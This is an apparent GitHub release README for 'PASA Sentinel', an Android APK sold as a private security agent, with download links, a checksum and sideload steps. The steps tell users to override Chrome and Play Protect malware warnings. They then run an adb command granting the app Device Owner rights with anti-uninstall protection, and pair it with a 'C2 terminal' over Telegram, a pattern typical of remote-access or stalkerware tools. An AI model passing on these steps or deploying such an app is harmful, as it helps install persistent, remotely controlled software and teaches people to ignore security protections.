# 📦 PASA Sentinel APK Releases

This directory hosts verified release binaries of **PASA Sentinel (Private Android Security Agent)**.

---

## 📥 Direct Downloads

| File | Release | Build | Size | Direct Link |
|---|---|---|---|---|
| **`pasa-v3.3.0-35.apk`** | `v3.3.0` (Latest Stable) | Build 35 | 18.19 MB | [Download APK](https://github.com/rbr48/pasa/raw/main/releases/pasa-v3.3.0-35.apk) |
| **`pasa-latest.apk`** | Rolling Latest | Build 35 | 18.19 MB | [Download Latest](https://github.com/rbr48/pasa/raw/main/releases/pasa-latest.apk) |
| **Archive Releases** | `v3.0.0` – `v3.2.9` | Legacy | Various | [GitHub Releases](https://github.com/rbr48/pasa/releases) |

Alternative Mirror (Fast CDN): [https://pasa.izhaanintellect.fun/releases/pasa-latest.apk](https://pasa.izhaanintellect.fun/releases/pasa-latest.apk)

---

## 🔐 Cryptographic Integrity (v3.3.0)

Always verify the SHA-256 checksum before sideloading onto your phone:

* **File:** `pasa-v3.3.0-35.apk` / `pasa-latest.apk`
* **File Size:** `19,069,880 bytes` (18.19 MB)
* **SHA-256 Checksum:**
  ```text
  ffad8366c0fffcd0c78d46803a46a23d762f8a61a44d17f56725ef68d54e29e2
  ```

### Verify Checksum:
- **Windows (PowerShell):**
  ```powershell
  Get-FileHash pasa-v3.3.0-35.apk -Algorithm SHA256
  ```
- **Linux / macOS:**
  ```bash
  sha256sum pasa-v3.3.0-35.apk
  ```

---

## 🚀 Quick Sideload & Installation

1. Transfer or download the APK to your Android device (Android 8.0 through Android 16).
2. If Chrome displays *"File might be harmful"*, tap **Download anyway** (standard for off-market sovereign packages).
3. If Google Play Protect shows a warning, tap **More details** → **Install anyway**.
4. To unlock Knox-grade Device Owner defense (anti-uninstall & lockscreen shade protection), connect via USB and execute:
   ```bash
   adb shell dpm set-device-owner com.izhaanintellect.pasa/.admin.PasaDeviceAdmin
   ```
5. Follow the [Complete Telegram Bot Setup Guide](../README.md#complete-telegram-bot-setup-guide) in the main README to pair your C2 terminal!
